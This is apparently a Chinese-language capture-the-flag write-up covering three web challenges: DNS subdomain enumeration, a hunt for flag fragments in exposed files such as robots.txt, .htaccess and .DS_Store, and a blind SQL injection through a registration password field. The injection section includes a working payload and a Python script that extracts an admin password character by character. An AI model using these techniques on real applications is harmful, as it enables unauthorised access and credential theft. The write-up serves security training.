# 1 Kitten War: Behind the Domain
host扫一下哪个域名是有解析记录的：
```bash
while read p; do
          echo $p.compass.college;
          host  $p.compass.college
  done <wordlist.txt
```
找到secrets.compass.college是有DNS解析的，在线解析一下：  
https://www.nslookup.io/dns-records/secret.compass.college  
在TXT信息中得到flag

# 2 Kitten War: 5 Cats in a Row=

# Solve
查看源代码得到第一部分flag
>\<!-- Here's the first part of the flag: -->

查看css得到
>/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2:  */

查看js得到
>/* How can I keep Google from indexing my website? */

去robots.txt得到第三部分flag

>\# I think this is an apache server... can you Access the next flag?

访问.htaccess (apache分布式配置文件)得到第四部分flag
>\# I love making websites on my Mac, I can Store a lot of information there.

访问.DS_Store 得到第五部分flag
>Congrats! You completed the supply quest. Part 5: 


# Kitten War: Black means Blind
鉴于第三题难度波动大，先看下有没有数据库文件泄露，顺便把session放到jwtCracker里跑  
看到flask和SQL，八九不离十就是注入了  
但是模板参数都不可控，没有SSTI的空间。而且有username的地方都有过滤：
```python
if any(c not in allowed_characters for c in username):
    return False
```
只有创建账户时的password是任意字符的
```python
execute( #这里的password只有长度限制1-50任意字符
  'INSERT INTO users (username, password)'
  f'VALUES (\'{username}\', \'{password}\');'
)
```
构造sql注入语句：
>'||(SELECT substr(password,n,1)FROM users));--

拼接后为：
```sql
INSERT INTO users (username, password) VALUES ('{username}',
 ''||(SELECT substr(password,n,1)FROM users));--');
```
因为hackin9(老板)是作为主键最早被插入的，所以拼接后的语句会将老板密码的第n个字符作为新用户的密码写入数据库。  
我们可以申请32个新用户，依次使用老板密码的第1-32位，然后尝试登录这32个新用户就能得到老板的密码。  
脚本：
```python
import requests

allowed_characters = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
for i in range(32):
    requests.post("http://103.102.44.218:10002/register",
                  data={"username": f"1145141919{str(i)}",
                        "password": f"'||(SELECT substr(password,{str(i + 1)},1)FROM users));--"})

for index in range(32):
    for char in allowed_characters:
        r = requests.post("http://103.102.44.218:10002/",
                          data={"username": f"1145141919{str(index)}",
                                "password": str(char)})
        if "Incorrect" not in r.text:
            print(char,end="")
            break
```
得到老板的密码uIurDVbIb2gDafUn5YOZIPsxWZOElHLB  
拿密码登录可以被RickRoll。下载音频后记事本/hex/strings打开翻倒最后得到flag  